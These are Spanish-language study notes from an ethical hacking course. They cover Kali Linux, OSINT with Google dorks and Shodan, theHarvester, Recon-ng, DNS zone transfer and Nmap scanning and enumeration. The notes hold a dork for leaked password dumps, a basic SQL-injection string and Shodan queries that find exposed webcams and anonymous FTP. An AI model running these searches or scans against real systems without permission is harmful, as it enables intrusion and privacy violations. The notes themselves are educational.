# Estudia
- Kali Linux / Hack the Box  
- Vulnerabilidades / CVE  
- EDR / XDR  
- Firewall / WAF  
- SIEM / SOAR  

# Kali Linux
Kali Linux es una distribución de Linux basada en Debian diseñada específicamente para pruebas de penetración, análisis forense digital y seguridad informática. Es mantenida y desarrollada por Offensive Security, y es ampliamente utilizada por profesionales de ciberseguridad, investigadores y entusiastas para evaluar la seguridad de sistemas y redes.  

# PHRACK
Es una revista con muchos artículos subidos a lo largo del tiempo respecto a la ciberseguridad.  

## Características de Kali Linux:
### Amplia colección de herramientas de seguridad:  
Kali Linux viene preinstalado con cientos de herramientas para realizar pruebas de penetración, auditorías de seguridad, análisis forense, ingeniería inversa y más. Algunas de las herramientas más conocidas incluidas son:  

- **Nmap**: Escáner de red.  
- **Metasploit Framework**: Plataforma de desarrollo de exploits.  
- **Wireshark**: Analizador de tráfico de red.  
- **John the Ripper**: Herramienta de cracking de contraseñas.  
- **Aircrack-ng**: Suite de herramientas para evaluar la seguridad de redes inalámbricas.  

### Actualizaciones y repositorios de seguridad:
Kali Linux es conocido por sus actualizaciones frecuentes y su acceso a repositorios de software específicamente ajustados para ciberseguridad. Las actualizaciones aseguran que las herramientas sean las versiones más recientes y estables.  

### Modos de instalación flexibles:
Kali Linux puede ejecutarse de varias maneras:  

- **Modo en vivo (Live)**: Arranque desde un USB o DVD sin necesidad de instalarlo en el disco duro.  
- **Instalación completa**: Instalación estándar en el disco duro.  
- **Máquinas virtuales**: Disponible como imagen para herramientas de virtualización como VMware y VirtualBox.  
- **Subsistema de Windows para Linux (WSL)**: Ejecutar Kali dentro de Windows.  

### Soporte para plataformas múltiples:
Además de las arquitecturas x86 y x64, Kali Linux también es compatible con ARM (como Raspberry Pi), lo que permite realizar pruebas de seguridad en dispositivos más pequeños o integrados.  

### Alta personalización y facilidad de uso:
Kali Linux es altamente personalizable y ofrece diferentes entornos de escritorio, como GNOME, KDE, Xfce y otros. También se pueden crear imágenes personalizadas con las herramientas específicas necesarias para ciertas pruebas.  

### Entornos seguros de desarrollo y pruebas:
Kali Linux incluye características como la posibilidad de ejecutar en modo "rootless" (sin superusuario) para aumentar la seguridad, lo que permite a los usuarios realizar pruebas de penetración en entornos más controlados.  

### Documentación y comunidad activa:
Kali Linux está bien documentado y cuenta con una comunidad activa de usuarios y desarrolladores. Hay manuales, tutoriales y cursos (como los de Offensive Security) que ayudan a los usuarios a aprender a usar las herramientas y técnicas de hacking ético.  

### Aplicaciones de Kali Linux:
- **Pruebas de penetración**: Usado por pentesters para identificar y explotar vulnerabilidades en sistemas y aplicaciones.  
- **Análisis forense digital**: Herramientas incluidas en Kali permiten analizar discos duros, recuperar datos eliminados y realizar investigaciones de seguridad.  
- **Investigación en ciberseguridad**: Utilizado por investigadores de seguridad para estudiar amenazas, malware y técnicas de hacking.  
- **Aprendizaje y educación**: Amplia base de uso en cursos de seguridad informática y hacking ético.  

# Comandos de Linux
- La tecla **TAB** nos permite ver los comandos que podemos usar.  
- **cd**: Nos posiciona en una carpeta o permite salir de una.  
- **ls**: Muestra los archivos o carpetas dentro de un directorio.  
- **rm**: Elimina carpetas/archivos.  
- **bash**: Permite iniciar instancias o ejecutar scripts.  
- **clear**: Limpia la consola.  
- **mkdir**: Crea un nuevo directorio.  
- **wget**: Descarga archivos.  
- **unzip**: Descomprime archivos `.zip`.  
- **-h**: Muestra todos los comandos.  
- **CTRL + C**: Cancela operaciones en la terminal.  
- **chmod**: Cambia los permisos de archivos y directorios.  
- **cat**: Muestra el contenido de un archivo de texto.  
- **sudo su**: Permite estar como administrador.  

## Sudo
- Permite utilizar comandos en modo superusuario.  
- **apt**: Simplifica tareas comunes como la instalación, actualización y eliminación de paquetes de software.  
  - **update**: Actualiza la lista de paquetes.  
  - **remove**: Desinstala aplicaciones.  
- **dhclient**: Solicita otras direcciones IP y realiza configuraciones de red.  

## Iptables
- Se utiliza para configurar y gestionar las reglas del cortafuegos.  
  - **-F**: Elimina todas las configuraciones y restablece `iptables` a sus valores predeterminados.  
  - **-S**: Lista todas las reglas actuales de `iptables`.  

## Pip
- Permite instalar o desinstalar paquetes de Python.  
  - **-r**: Instala requerimientos/dependencias.  

## Python
- Ejecuta el intérprete de Python.  
  - **-h**: Muestra todos los comandos.  

# Clase de teoría: Hacking ético día 2 (30/08/2024)
## Teoría
En el curso vimos las diferentes metodologías que se van a tratar, también ciertos aspectos relacionados con contratos, cómo proceder al recibir la aprobación por parte del cliente y cómo realizar un informe de hacking ético.  

### Metodologías
- **OSSTMM**  
- **The Penetration Testing Execution Standard**  
- **ISSAF**  
- **OTP**  
### Metodología usada en el curso
- Definición del alcance del test de penetración
- Recopilación de información
- Identificación y análisis de vulnerabilidades
- Explotación de las vulnerabilidades
- Post-Explotación
- Elaboración del reporte

### Definición del alcance del hacking ético
- Antes de realizar ninguna acción, discutir con el cliente las tareas que se llevarán a cabo
- Asegurar mediante contrato firmado
- Análisis de las políticas de la organización que define el uso que los usuarios hacen de los sistemas
- Procedimiento en el caso que se genere una intrusión por parte de un tercero

### Ejemplos de informes y auditorías de seguridad
- https://pentestreports.com/templates
- https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report

# Clase teórico/práctica día 1 30/08/2024

## Teoría

### Recopilación pasiva de información o también llamada OSINT
- Recopilar la mayor cantidad de información de la infraestructura sin interactuar lo más mínimo con el objetivo.
- Recolección de información sobre un objetivo determinado sin que las actividades realizadas por el analista sean mínimamente detectadas.

### Pros y contras
- Difícil de realizar, proporciona poca información.
- La manera es con información pública.
- Raramente se utiliza de manera individual.

### Dónde aplicarla
- Cuando no se tiene nada de información del objetivo.
- En empresas con una infraestructura antigua.

## Práctica - Uso de Google Dorks, Comandos y operadores booleanos usados
- Site
- Filetype
- ""
- Ext

### Ejemplos de Dorking
- `site:Udemy.com filetype:PDF
- "index of"/"chat/logs"
- filetype*:txt
- filetype:SQL"MySQL dump"(pass|password|passwd|pwd)
- inurl:index.php?id= SQL injection -> 'or'1'=='1'--
- site gov file type:pdf allintitle

### Links para más dorks y ayudas
- https://gist.github.com/zachbrowne/489762a6852abb24f9e3
- https://www.exploit-db.com/google-hacking-database

### Comandos Principales de Dorks
- **define**:término - Se muestran definiciones procedentes de páginas web para el término buscado.
- **filetype**:término - Las búsquedas se restringen a páginas cuyos nombres acaben en el término especificado. Sobretodo se utiliza para determinar la extensión de los ficheros requeridos. Nota: el comando ext:término se usa de manera equivalente.
- **site**:sitio/dominio - Los resultados se restringen a los contenidos en el sitio o dominio especificado. Muy útil para realizar búsquedas en sitios que no tienen buscadores internos propios.
- **link**:url - Muestra páginas que apuntan a la definida por dicha url. La cantidad (y calidad) de los enlaces a una página determina su relevancia para los buscadores. Nota: sólo presenta aquellas páginas con pagerank 5 o más.
- **cache**:url - Se mostrará la versión de la página definida por url que Google tiene en su memoria, es decir, la copia que hizo el robot de Google la última vez que pasó por dicha página.
- **info**:url - Google presentará información sobre la página web que corresponde con la url.
- **related**:url - Google mostrará páginas similares a la que especifica la url. Nota: Es difícil entender qué tipo de relación tiene en cuenta Google para mostrar dichas páginas. Muchas veces carece de utilidad.
- **allinanchor**:términos - Google restringe las búsquedas a aquellas páginas apuntadas por enlaces donde el texto contiene los términos buscados.
- **inanchor**:término - Las búsquedas se restringen a aquellas apuntadas por enlaces donde el texto contiene el término especificado. A diferencia de allinanchor se puede combinar con la búsqueda habitual.
- **allintext**:términos - Se restringen las búsquedas a los resultados que contienen los términos en el texto de la página.
- **intext**:término - Restringe los resultados a aquellos textos que contienen término en el texto. A diferencia de allintext se puede combinar con la búsqueda habitual de términos.
- **allinurl**:términos - Sólo se presentan los resultados que contienen los términos buscados en la url.
- **inurl**:término - Los resultados se restringen a aquellos que contienen término en la url. A diferencia de allinurl se puede combinar con la búsqueda habitual de términos.
- **allintitle**:términos - Restringe los resultados a aquellos que contienen los términos en el título.
- **intitle**:término - Restringe los resultados a aquellos documentos que contienen término en el título. A diferencia de allintitle se puede combinar con la búsqueda habitual de términos.

### Operadores Booleanos Google Hacking

Google hace uso de los operadores booleanos para realizar búsquedas combinadas de varios términos. Esos operadores son una serie de símbolos que Google reconoce y modifican la búsqueda realizada:

- **" "**: Busca las palabras exactas.
- **"- -"**: Excluye una palabra de la búsqueda. (Ej: gmail -hotmail, busca páginas en las que aparezca la palabra gmail y no aparezca la palabra hotmail)
- **OR (ó |)**: Busca páginas que contengan un término u otro.
- **"+ -"**: Permite incluir palabras que Google por defecto no tiene en cuenta al ser muy comunes (en español: "de", "el", "la".....). También se usa para que Google distinga acentos, diéresis y la letra ñ, que normalmente son elementos que no distingue.
- **"* -"**: Comodín. Utilizado para sustituir una palabra. Suele combinarse con el operador de literalidad (" ").
# Clase practica dia 2 2/09/2024

## Shodan
- Es otra herramienta/Buscador que nos permite la recolección pasiva de información accediendo directamente a puertos abiertos con procesos corriendo, revisando directamente sus vulnerabilidades, si podemos acceder a ellas de manera sencilla o si no, por defecto Shodan intenta hacer login. Nos muestra los puertos abiertos con servicios corriendo, nos ofrece un apartado para desarrolladores en la que expone una API en la que podemos realizar consultas con diferentes lenguajes de programación.
- Es distinta a Google Dorks ya que las consultas van sobre banners que nos devuelven los diferentes servicios al hacerle una petición a un puerto. Seremos capaces de encontrar cualquier tipo de sistema que tenga puertos abiertos y que tenga procesos corriendo en ellos, cámaras, refrigeradores, cualquier cosa conectada a internet. Con ciertos comandos podemos dirigir las consultas hacia un objetivo.

## Comandos Shodan

### FTP
- Cuando contiene el banner esa palabra, es probable que en ese puerto esté corriendo el servicio FTP. *FTP = puerto 21*

#### FTP Definición
- El Protocolo de transferencia de archivos es un protocolo de red para la transferencia de archivos entre sistemas conectados a una red TCP, basado en la arquitectura cliente-servidor.

### Anonymous
- Nos muestra si permite el login de un usuario anónimo, si lo permite, si tiene restricciones, si no las tiene.

### Country ""
- Este comando nos permite filtrar por país. Ejemplos: "CO" -> Colombia, "ES" -> España, "US" -> Estados Unidos.

### login ok
- Este comando nos permite revisar todos los puertos que reciban un login anónimo.

### ORG
- Nos permite consultar sobre una organización en específico.

### Cámaras
- `"Server: yawcam" "Mime-Type: text/html"` -> Nos permite ver webcams que tengan el software yawcam.
- `("webcam 7" OR "webcamXP") http.component:"mootools" -401` -> Nos permite ver webcams con el software webcamXP, aunque no nos permite abrirlos.
- `"Server: IP Webcam Server" "200 OK"` -> Nos permite ver webcams que tengan el software IP Webcam.

## Links para más comandos de Shodan
- [https://github.com/jakejarvis/awesome-shodan-queries](https://github.com/jakejarvis/awesome-shodan-queries)

## Comandos principales de Shodan

- **After**: Solo muestra resultados después de la fecha dada (dd/mm/yyyy).
- **Asn**: Autonomous system number.
- **Before**: Solo muestra resultados antes de la fecha dada (dd/mm/yyyy).
- **Category**: Categorías disponibles: ics, malware.
- **City**: Nombre de la ciudad.
- **Country**: Código del país de 2 letras.
- **Geo**: Acepta entre 2 y 4 parámetros. Si 2 parámetros: latitud, longitud. Si 3 parámetros: latitud, longitud, rango. Si 4 parámetros: latitud superior izquierda, longitud superior izquierda, latitud inferior derecha, longitud inferior derecha.
- **Hash**: Hash de la propiedad de datos.
- **Has_ipv6**: True/False.
- **Has_screenshot**: True/False.
- **Server**: Dispositivos o servidores que contienen un encabezado específico de servidor.
- **Hostname**: Nombre completo del host para el dispositivo.
- **Ip**: Alias para filtro de red.
- **Isp**: ISP que gestiona el bloque de red.
- **Net**: Rango de red en notación CIDR.
- **Org**: Organización asignada al bloque de red.
- **Os**: Sistema operativo.
- **Port**: Número de puerto para el servicio.
- **Postal**: Código postal (solo en EE.UU.).
- **Product**: Nombre del software/producto que proporciona el banner.
- **Region**: Nombre de la región/estado.
- **State**: Alias para región.
- **Version**: Versión del producto.
- **Vuln**: ID de la vulnerabilidad CVE.

## Bases de datos Whois
- Son bases de datos que contienen nombres de dominio. Para registrar un nombre de dominio, es necesario proporcionar ciertos datos como nombre, teléfono, direcciones, etc.

### Cómo usar
- En la terminal de Kali Linux, usa el comando Whois seguido del nombre de dominio.

## Archive.org
- Nos permite revisar los registros históricos de las páginas, por snapshots. La página trata de recrear la página web tal y como existió en el momento en el que lo selecciones.

### Cómo usar
- Busca `archive.org` en el buscador y luego ingresa la URL que quieras ver.

## Censys
- Escanea internet todos los días con Zmap, hace indexaciones diferentes a las que se pueden lograr con Shodan. Se puede acceder a distintos resultados más recientes por Zmap.

### Cómo usar
- [https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=ftp](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=ftp)

# Clase práctica día 3 3/09/2024

## The Harvester - Usable
- Nos permite automatizar la búsqueda que realizamos anteriormente con Google, Shodan y Censys al escribir el dominio del objetivo y realizar automáticamente las consultas.

### Comandos de The Harvester
- `-h`: Este comando muestra todos los comandos de The Harvester.
- `-d`: Aquí ponemos el dominio de nuestro objetivo.
- `-b`: Aquí colocamos los buscadores que queremos usar, separando con `*,*`. Podemos usar varios buscadores.
- `-l`: Aquí especificamos la cantidad de consultas que queremos que realice. *IMPORTANTE*: Colocar un límite para evitar que nos baneen la IP por demasiadas consultas.
- `-f`: Permite volcar los resultados obtenidos a un archivo.

#### Ejemplos
- `theHarvester -d microsoft.com -b baidu -l 100`
- `theHarvester -d microsoft.com -b baidu,yahoo,duckduckgo,bing -l 100`
- `theHarvester -d microsoft.com -b baidu,yahoo,duckduckgo,bing -l 100 -f resultados`

### Links y ayudas
- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)
- Se accede por la terminal de Kali Linux con el comando `theHarvester -h`.

## Miniconda
- Instalamos una versión antigua de The Harvester, que instalamos en Kali Linux creando un entorno virtual con Miniconda. Configuramos el entorno para poder acceder a la versión antigua de The Harvester junto con las dependencias de Python 3.8.0 sin que interfieran con los demás programas que tengamos instalados.

### Comandos Miniconda
- `conda config --set`
- `conda create -n "" python=Version`
- `conda Activate`
- `conda deactivate`

### Links para la descarga
- [https://docs.anaconda.com/miniconda/](https://docs.anaconda.com/miniconda/)
- [https://github.com/laramies/theHarvester/releases?page=2](https://github.com/laramies/theHarvester/releases?page=2)

### Cómo acceder
- Podemos acceder a este entorno virtual desde la terminal con los siguientes comandos:
  - `cd`: A la carpeta donde creamos el entorno.
  - `conda activate Old_Harvester`: Para activar el entorno conda.
  - `conda deactivate`: Para desactivar el entorno conda.
  - `cd`: A la carpeta de The Harvester.
  - `python theHarvester.py`: Para empezar a usarlo.

### Ejemplos de comandos The Harvester antiguo vistos
- `python theHarvester.py -d microsoft.com -b google -l 100 -f Resultados2`
- `python theHarvester.py -d microsoft.com -b trello -l 100 -f Resultados2`
# Clase práctica día 4 - 04/09/2024
## Maltego - Usable
- Nos proporciona más flexibilidad que TheHarvester. Para Maltego, todas las consultas que hagan una query a una base de datos generarán comandos que nos permitirán obtener esa información. Podemos recrear relaciones que hay entre un objetivo y personas, correos, números de teléfono, redes sociales y cualquier otra información que tengamos, permitiéndonos obtener datos específicos con transformadores y así obtener toda la información requerida de una persona y/o empresa.

# Clase práctica día 5 - 06/09/2024
## Recon-ng
- Esta app nos permite automatizar la búsqueda de información por consultas a dominios. Utiliza módulos muy parecidos a lo anteriormente visto en Maltego con los transformadores. Tenemos que instalar módulos desde el lugar denominado por Recon-ng como "marketplace". Para instalar los módulos usaremos los comandos:  
  `marketplace search` -> `marketplace info` -> `marketplace install`.  
  Para usar un módulo usaremos los comandos:  
  `modules search` -> `marketplace load "El módulo"`.  
  Al ingresar el comando `options list` nos permite ver los datos que tenemos que poner a la hora de cargar uno de los módulos, ejemplos:  
  `SOURCE "Dominio"`, `CREATOR "Nombre del archivo"`.  
  También tenemos módulos que nos permiten visualizar los datos de una manera muy amigable en la parte final del `marketplace search`.

### Comandos 
- help
- modules
- marketplace
- search
- info
- install
- options
- run
- show
- keys
- add
- back

### Recon/domains-contacts/whois_pocs
- Este es uno de los módulos de Whois, trabajados durante el curso. Para iniciarlo, sus comandos son:  
  `options set SOURCE "Dominio"`.  
  Ahora si mostramos la información con `info`, el módulo ya tiene cargado el dominio previamente puesto. Para correr este módulo se usa el comando `run`. Si este módulo encuentra información, en concreto contactos relacionados al dominio previamente buscado, se guardarán en la tabla `contacts`. Para acceder a esta carpeta, en este caso es con el comando `show "Nombre de la carpeta"`.

### Recon/companies-multi/shodan.org
- Este es uno de los módulos de Shodan, trabajados en clase. Para iniciarlo, sus comandos son:  
  `options set SOURCE "Dominio"`.  
  Ahora si mostramos la información con `info`, el módulo ya tiene cargado el dominio previamente puesto. Para correr este módulo se usa el comando `run`.

# Fin de las clases de recolección de información de manera pasiva

# Clase teórica/práctica día 7 - 09/09/2024
## Recolección pasiva/activa de información
- Recolección de información sobre un objetivo determinado utilizando métodos que se asimilen al tráfico de red y comportamiento normal que suele recibir.

### Dentro del alcance se encuentran actividades como:
- Consultas a servidores DNS
- Acceso a recursos internos de las aplicaciones web
- Análisis de metadatos de documentos

## Quedan fuera las actividades con comportamiento anómalo.

## Foca - Análisis de metadatos - Usable
- `foca.elevenpath site:github`  
  Foca es un software que nos permite escanear archivos para conocer su metadata, si tiene virus, también nos permite automatizar la búsqueda de información pasiva mediante Google Dorks. Permite buscar información de forma pasiva de un objetivo y usarla para conocer contraseñas, correos, números de teléfono, etc. Es una herramienta crucial ya que permite la extracción completa de metadatos de los archivos. Foca solo se puede correr en Windows.

# Clase teórica/práctica día 8 - 10/09/2024
## Otros usos de los metadatos
### Metagoofile
- Otra herramienta que nos permite la extracción de metadatos. No tiene actualizaciones desde hace 8 años, es una aplicación que nos sirve para los mismos usos que Foca, solo que un poco más rudimentaria, y que solo nos permite consultar en Google. La corremos desde la consola de Kali Linux, dependiendo de la herramienta `exiftool` para la extracción de los metadatos.

### Metashield Analyzer
- Esta es otra de las herramientas disponibles para la extracción de metadata de archivos. La diferencia con las otras es que esta es una aplicación web.

### Protocolo DNS (Domain Name System)
- Realiza una traducción de nombres de dominio a direcciones IP.
- Corresponde con uno de los protocolos más importantes de internet.
- Nos permite obtener información pública sobre un dominio u organización.
- Descubrir relaciones entre dominios y hosts.
- Técnicas de explotación específicas para ganar acceso.
- DNS Zone = agrupación de registros (datos) DNS.
- Las DNS Zones contienen diferentes tipos de registros.

### Registros

| Tipo  | Significado               | Valor                       |
|-------|---------------------------|-----------------------------|
| SOA   | Start of authority        | Parámetros para esta        |
| A/AAA | Dirección IP de un host   | 32 Bits                     |
| MX    | Mail Exchange             | Dominio para correo         |
| NS    | Name server               | Nombre de un servidor       |
| CNAME | Canonical name            | Alias del nombre del host   |
| PTR   | Pointer                   | Alias para una dirección IP|
| SRV   | Services description      | Servicios disponibles       |
| TXT   | Text                      | Información de texto        |

### ¿Cómo funciona el DNS?
- El usuario realizará consultas a un dominio (en este caso `example.com`) para obtener información relevante sobre dicho dominio. Para poder acceder a un sitio web, necesitará la IP a la cual pertenece dicho dominio. Para obtener esta IP, el usuario realizará una consulta al Local DNS Resolver, el cual revisará si la dirección IP de dicho dominio existe. Si no es así, este enviará una consulta al DNS Root Name Server, el cual hará lo mismo. Si no tiene la IP, devolverá al Local DNS Resolver una dirección para los nombres de dominios `.com`. Ahora, el Local DNS Resolver realizará una consulta al Top Level DNS Server, el cual aloja los dominios `.com`. Este devolverá el Name Server que tenga dicho dominio. Finalmente, el Local DNS Resolver enviará una consulta al Authoritative DNS Server, el cual tendrá la dirección IP a la que está asociada dicho dominio. El Local DNS Resolver obtendrá esta información y se la proporcionará al usuario, quien podrá consultar directamente el web server con dicha dirección IP devuelta.

# Clase práctica día 9 - 10/09/2024
### CentralOps - Domain Dossier
- Nos permite realizar búsquedas a los dominios, mostrándonos información que nos puede ayudar para la recolección semi-pasiva de información, ya que nos permite obtener correos, direcciones IP. Es una herramienta muy sencilla, pero que nos puede ayudar a la hora de recolectar información sobre un objetivo.

### DNSDumpster - Usable
- Esta herramienta está demasiado completa, ya que nos permite realizar consultas a un dominio y obtener más información, como geolocalización. Nos realiza un diagrama mostrándonos las relaciones que tiene ese dominio web. Nos brinda información sobre su proveedor de internet, nos permite encontrar direcciones IP alojadas en el mismo servidor, obtener las cabeceras, saber por qué name servers ha pasado para llegar al resultado, nos permite buscar banners y buscar los servicios. Nos realiza gráficos y nos permite descargar la información obtenida en tablas de Excel.

## Sniffers
- Son herramientas que se sitúan en nuestro sistema operativo y monitorean todo el tráfico de red entrante y saliente. Nos permiten visualizar los paquetes de red y el tráfico de red de una manera bastante intuitiva.

### Wireshark
- Es uno de los sniffers más conocidos y es el más completo, con respecto a todos, teniendo distintas funciones y un mejor manejo. Permite visualizar protocolos, el código detrás de las páginas, paquetes, etc.
  - ETH0 -> Nos conecta con internet.
  - Loopback -> La interfaz del localhost.

# Clase práctica día 10 - 13/09/2024
### TCPdump
- Es un sniffer muy completo, que se maneja totalmente por consola.  
  - `-D` -> Nos permite ver las interfaces activas en nuestro sistema.  
  - `-i` -> Nos permite mostrar una interfaz determinada y así empezar a capturar un tráfico de red.  
  - `-v` -> Nos permite obtener más información.  
  - `icmp` -> Nos muestra únicamente información del tráfico ICMP.  
  - `host` -> Nos muestra el tráfico dirigido únicamente hacia un host concreto.  
  - `-w` -> Nos permite guardar una captura del tráfico que detecte.  
  - `-r` -> Nos permite abrir un archivo que contenga tráfico.  
  - `-n` -> Nos permite observar el tráfico hacia un puerto específico.

# Clase teórica/práctica día 11 - 16/09/2024
## Recopilación activa de información
- Es la recolección sobre un objetivo determinado utilizando métodos que interactúan directamente con él, normalmente mediante el envío de tráfico de red. En muchas ocasiones, la actividad de este tipo de técnicas suele ser detectada como actividad sospechosa o maliciosa.
### Dentro del alcance se encuentran actividades como 
 - Escáneres de host
 - Escáneres de puertos
 - Escáneres de servicio

### HackerOne
 - Es una página para poder probar las herramientas de recolección activa de información y, si descubres alguna vulnerabilidad, también puedes ganar dinero.
### Metasploitable 3
 - https://github.com/rapid7/metasploitable3?tab=readme-ov-file
 - Es una herramienta que nos permite crear maquinas virtuales con ciertas vulnerabilidades puestas adere asi podemos crear nuestro entorno de haking etico activo sin tener que usar ninguna de las herramientas que veamos contra ninguna organizacion ni objetivo especifico ya que puede ser ilegal en algunos paises
 - una de las formas para descargar esas maquinas virtuales fue mediante github cambiando el nombre del archivo descargado desde vagrant a una extension . zip haciendo esto 2 veces nos permitio descargarlos sistemas operativos de una manera sencilla, rapida y gratis

# Clase práctica día 12 17/09/2024
# Clase práctica día 13 20/09/2024
# Clase práctica día 14 23/09/2024
# Clase práctica día 15 24/09/2024
# Clase práctica día 16 26/09/2024

### DNSrecon y transferencia de zona
 - Para usar la transferencia de zona vimos una pagina la cual su dominio es zonetransfer.me, lo que queremos hacer al momento de ver la transferencia de zona es la informacion que se puede filtrar en ese tipo de ficheros, todo esto claro por mala practica de las empresas al no gestionar el servidor de manera correcta.
 - Dns recon es una app que no tiene interfaz gráfica y se maneja por medio de comandos, con las consultas correctas nos permite obtener el fichero de zona únicamente si se cumple la condición previamente dicha y es que el servidor esté mal configurado, todo este proceso también lo podemos hacer manual incluso desde una terminal de windows con los siguientes comandos: 
    * `nslookup`
    * `set type="ns"`
    * `"Dominio"`
    * `server "Servidor"`
    * `ls -d "Dominio"`.

#### Comandos 
 - `dnsrecon`
 - `-d` -> con este comando dirigimos hacia qué dominio irá dirigido 
 - `-t` -> ponemos el tipo que deseamos que nos pase en este caso *afxr* que es el comando que solicita la transferencia de zona

### Nmap
 - https://nmap.org/man/es/index.html

## Estados de los puertos
Estados en los que pueden encontrarse los puertos:

### open
 - An application is actively accepting TCP connections, UDP datagrams or SCTP associations on this port. Finding these is often the primary goal of port scanning. Security-minded people know that each open port is an avenue for attack. Attackers and pen-testers want to exploit the open ports, while administrators try to close or protect them with firewalls without thwarting legitimate users. Open ports are also interesting for non-security scans because they show services available for use on the network.

### closed
 - A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it. They can be helpful in showing that a host is up on an IP address (host discovery, or ping scanning), and as part of OS detection. Because closed ports are reachable, it may be worth scanning later in case some open up. Administrators may want to consider blocking such ports with a firewall. Then they would appear in the filtered state, discussed next.

### filtered
 - Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software. These ports frustrate attackers because they provide so little information. Sometimes they respond with ICMP error messages such as type 3 code 13 (destination unreachable: communication administratively prohibited), but filters that simply drop probes without responding are far more common. This forces Nmap to retry several times just in case the probe was dropped due to network congestion rather than filtering. This slows down the scan dramatically.

### unfiltered
 - The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets, classifies ports into this state. Scanning unfiltered ports with other scan types such as Window scan, SYN scan, or FIN scan, may help resolve whether the port is open.

### open|filtered
 - Nmap places ports in this state when it is unable to determine whether a port is open or filtered. This occurs for scan types in which open ports give no response. The lack of response could also mean that a packet filter dropped the probe or any response it elicited. So Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way.

### closed|filtered
 - This state is used when Nmap is unable to determine whether a port is closed or filtered. It is only used for the IP ID idle scan.

#### Técnica de descubrimiento de host
 - Nmap es una herramienta sin interfaz gráfica, en esta lección nos enseñaron a hacer un host discovery el cual nos sirve para realizar un escaneo a un host previamente identificado, así podemos saber cuántas máquinas hay conectadas a él, cuántos están arriba, y si hay conexión con dicho host. Funciona de tal manera que manda una consulta a los puertos 443 y 80, y les pregunta si tienen a alguien con la IP objetivo. También podemos obtener mejores resultados y ser menos intrusivos si ejecutamos esos comandos con permisos de administrador ya que la consulta se convierte en una ARP, preguntando de nuevo quién tiene dicha IP para ver quién responde, obteniendo los mismos resultados pero de una manera menos intrusiva. También nos permite obtener todos los host de una infraestructura de red sin la necesidad de proporcionarle una dirección IP, con este comando `-sn "Nuestra IP"/24` nos permite ver todos los host que están abiertos. Lo que hace Nmap es mandar un Broadcast de tipo ARP a todos los nodos que le hayamos parametrizado, en este caso 250, si ve que no le responde un nodo pasa al siguiente hasta que alguno le responda para luego mandar una conexión hacia el puerto 80. Si consigue mandar el broadcast a un host pero este no le responde la conexión al puerto 80, Nmap lo tomará como si estuviera apagado, pero no significa que esté apagado, simplemente puede ser que no tenga nada corriendo en el puerto 80 para poder darle respuesta. Aquí podemos notar la importancia de ejecutar Nmap como administrador, ya que depende de realizar la conexión TCP a alguno de los puertos 80 o 443, con derechos de administrador Nmap nos va a mostrar aquellos host los cuales no tenemos conexión pero nos respondieron el broadcast. Es importante saber si necesitamos más conocer todos los host, los cuales dan una respuesta o solo aquellos que nos permiten una conexión, todo con el mismo comando pero únicamente añadiendo los permisos de administrador. También podemos hacer un escaneo mucho más intrusivo con el comando `-PS`, ya que va a escanear todos los puertos del host que nosotros le indiquemos, haciendo mucho más ruido y siendo mucho más intrusivo, pero este comando también lo podemos limitar ya que lo que intenta hacer es buscar una conexión con todos los puertos para luego escanearlos y ver cuáles están abiertos. Si lo limitamos a que ingrese por un puerto y escanee ese mismo puerto o cualquier otro, así vamos a poder pasar mucho más desapercibidos.

#### Escaneo de puertos
 - Nmap también nos permite el escaneo de puertos con el uso del comando `-sS`. Nmap lo que va a hacer es preguntar si alguien tiene el host que le indicamos, luego comenzará a mandar conexiones de tipo TCP a todos los puertos para así poder mostrarnos qué puertos están abiertos y el tipo de tarea que está ejecutando en ese puerto. También nos permite escanear todos los host que le parametricemos al quitar la dirección del host y poner en su lugar `0/24` o parametrizar de donde a donde quieres realizar el escaneo de hosts parametrizando desde un número de host a otro. *Ejemplo:* `125-135`, así comenzará a escanear todos los host que le den una respuesta y comenzará a realizar las consultas TCP para revisar todos sus puertos, o los que le hayamos parametricado. Este comando solo se puede ejecutar como administrador.

#### Descubrimiento de servicios
 - Vimos cómo Nmap, con este comando `-sV`, nos ayuda a descubrir cuáles son los servicios que están corriendo dentro de los puertos que están abiertos, nos ayuda a descartar el script base de Nmap donde supone el tipo de servicio que está corriendo en dicho puerto, y nos revela cuál es el servicio y su versión.

#### Descubrimiento de sistema operativo
 - En esta sección vimos cómo Nmap con el comando `-O` es capaz de descubrir o tener idea de qué sistema operativo usa el objetivo, lo hace escaneando diferentes servicios que están corriendo para así tener una idea de cuál es el sistema operativo.

#### Nmap con el protocolo SMB
 - Los scripts en Nmap nos ayudan a usar ciertas herramientas que Nmap trae por defecto que ya tienen tareas automatizadas, estos scripts los encontramos en `/usr/share/nmap/scripts`.

#### Scripts SMB
 - `--script=smb-os-discovery` -> Este script nos permite descubrir el sistema operativo que tiene nuestro objetivo.
 - `--script=smb-enum-shares` -> Este script nos permite ver las carpetas que está compartiendo y si tiene acceso o no a ella.

#### nmap con el protocolo SNMP
- El protocolo SNMP es uno de los más importantes en la ciberseguridad, ya que comúnmente se deja abierto al momento de crear servidores y por allí podemos obtener información valiosa. Este siempre está en el puerto 161, el cual funciona por UDP.

#### Scripts SNMP
- `--script=snmp-win32-software` -> Nos muestra los programas que hay instalados en el objetivo con sus versiones.
- `--script=snmp-win32-users` -> Nos muestra todos los usuarios que hay dentro del objetivo.
- `--script=snmp-processes` -> Nos muestra todos los procesos que están corriendo en el objetivo.
- `--script=snmp-netstat` -> Nos muestra todas las conexiones que están corriendo en el objetivo.

### Comandos Nmap
- `-sn` -> Nos permite realizar un escaneo de los puertos 80 y 443.
- `-v` -> Nos permite obtener más información al momento de obtener los resultados.
- `-reason` -> Nos muestra la razón por la cual el puerto está cerrado o abierto.
- `-oX` -> Nos permite exportar los datos obtenidos a un archivo, por ejemplo, XML.
- `stylesheet` -> Nos permite insertarle una hoja de estilos al archivo creado.
- `-sV` -> Nos permite realizar el descubrimiento de servicios que corren dentro de un puerto abierto.
- `-O` -> Nos permite obtener información del sistema operativo.
